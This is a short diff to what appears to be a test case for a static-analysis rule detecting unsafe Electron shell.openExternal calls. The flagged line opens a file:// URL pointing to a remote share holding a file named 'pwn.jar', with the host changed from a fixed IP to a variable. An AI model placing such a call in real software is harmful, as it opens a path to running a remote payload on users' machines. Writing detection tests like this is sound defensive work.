@@ -65,4 +65,4 @@ const mainWindow = new BrowserWindow({
 })
 
 // ruleid:electron_shell_openexternal
-shell.openExternal("file://192.168.0.110/share/pwn.jar")
+shell.openExternal("file://"+ip+"/share/pwn.jar")
